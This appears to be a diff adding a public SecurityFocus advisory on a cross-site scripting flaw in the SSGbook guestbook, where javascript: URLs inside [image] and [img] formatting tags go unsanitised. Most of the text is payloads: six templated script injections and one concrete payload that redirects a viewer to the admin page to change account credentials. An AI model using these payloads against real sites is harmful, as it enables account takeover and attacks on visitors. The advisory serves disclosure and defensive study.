@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/5915/info
+
+SSGbook includes codes for allowing users to specify HTML formatting and layout inside of guestbook entries. For example, a user can include an image by including it inside of [image] or [img] tags. However, arbitrary HTML and script code are not sufficiently sanitized within these tags.
+
+As a result, users may include malicious HTML and script code inside of guestbook entries. The attacker-supplied code will be rendered in the web client of a user who views a malicious guestbook entry. 
+
+[image]javascript:{SCRIPT}[/image]
+
+[img=right]javascript:{SCRIPT}[/img=right]
+
+[image=right]javascript:{SCRIPT}[/image=right]
+
+[img=left]javascript:{SCRIPT}[/img=left]
+
+[image=left]javascript:{SCRIPT}[/image=left]
+
+[img]javascript:{SCRIPT}[/img]
+
+[image]javascript:document.location="ss_admin.asp?Mode=Update&Acton=Access&UserName=Pom&Password=turlututu";[/image]
+
+
